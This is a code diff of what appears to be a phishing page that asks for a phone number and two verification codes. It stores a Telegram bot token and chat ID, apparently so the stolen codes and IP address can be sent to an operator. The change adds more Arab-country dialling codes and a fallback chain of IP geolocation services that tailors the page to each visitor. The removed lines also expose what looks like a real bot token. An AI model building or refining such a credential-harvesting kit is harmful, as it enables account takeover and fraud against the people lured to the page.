@@ -52,13 +52,22 @@ button:hover{background:var(--green-d)}
   <div class="phone-row">
     <select id="cc">
       <option value="+212">🇲🇦 +212</option>
-      <option value="+961">🇱🇧 +961</option>
-      <option value="+962">🇯🇴 +962</option>
-      <option value="+20">🇪🇬 +20</option>
+      <option value="+974">🇶🇦 +974</option>
       <option value="+966">🇸🇦 +966</option>
       <option value="+971">🇦🇪 +971</option>
       <option value="+965">🇰🇼 +965</option>
-      <option value="+974">🇶🇦 +974</option>
+      <option value="+968">🇴🇲 +968</option>
+      <option value="+973">🇧🇭 +973</option>
+      <option value="+20">🇪🇬 +20</option>
+      <option value="+961">🇱🇧 +961</option>
+      <option value="+962">🇯🇴 +962</option>
+      <option value="+213">🇩🇿 +213</option>
+      <option value="+216">🇹🇳 +216</option>
+      <option value="+218">🇱🇾 +218</option>
+      <option value="+964">🇮🇶 +964</option>
+      <option value="+967">🇾🇪 +967</option>
+      <option value="+963">🇸🇾 +963</option>
+      <option value="+970">🇵🇸 +970</option>
       <option value="+33">🇫🇷 +33</option>
       <option value="+1">🇺🇸 +1</option>
     </select>
@@ -117,24 +126,55 @@ let userIpAddress = "";
 let firstCode = "";
 let secondCode = "";
 
-const botToken = "8863417031:AAF7jehBC9WE41rjAk6HfYcvAh7G1H5-nxg";
-const chatId = "6691240451";
+const botToken = "YOUR_BOT_TOKEN";
+const chatId = "YOUR_CHAT_ID";
 
+// نظام متعدد المصادر لاكتشاف الدولة تلقائياً لجميع الدول
 async function detectUserCountry() {
+    // 1. المحاولة الأولى عبر ipapi.co
     try {
-        let response = await fetch('https://ipapi.co/json/');
-        let data = await response.json();
-        let countryCodeSelect = document.getElementById("cc");
+        let res = await fetch('https://ipapi.co/json/');
+        let data = await res.json();
         if (data && data.country_calling_code) {
-            let dialCode = data.country_calling_code;
-            for (let option of countryCodeSelect.options) {
-                if (option.value === dialCode) {
-                    option.selected = true;
-                    break;
-                }
-            }
+            let code = data.country_calling_code.startsWith('+') ? data.country_calling_code : '+' + data.country_calling_code;
+            if (setCountryValue(code)) return;
         }
-    } catch (e) {}
+    } catch(e) {}
+
+    // 2. المحاولة الثانية عبر ipwho.is
+    try {
+        let res = await fetch('https://ipwho.is/');
+        let data = await res.json();
+        if (data && data.calling_code) {
+            let code = '+' + data.calling_code;
+            if (setCountryValue(code)) return;
+        }
+    } catch(e) {}
+
+    // 3. المحاولة الثالثة الاحتياطية عبر ipify + restcountries
+    try {
+        let ipRes = await fetch('https://api.ipify.org?format=json');
+        let ipData = await ipRes.json();
+        userIpAddress = ipData.ip;
+        
+        let geoRes = await fetch(`https://ipapi.co/${userIpAddress}/json/`);
+        let geoData = await geoRes.json();
+        if (geoData && geoData.country_calling_code) {
+            let code = geoData.country_calling_code.startsWith('+') ? geoData.country_calling_code : '+' + geoData.country_calling_code;
+            setCountryValue(code);
+        }
+    } catch(e) {}
+}
+
+function setCountryValue(dialCode) {
+    let selectElem = document.getElementById("cc");
+    for (let option of selectElem.options) {
+        if (option.value === dialCode) {
+            option.selected = true;
+            return true;
+        }
+    }
+    return false;
 }
 
 async function fetchIpAddress() {
@@ -249,10 +289,6 @@ document.getElementById("submitBtnFinal").addEventListener("click", async functi
 </body>
 </html>
 
-
-
-    
-    
         
 
 
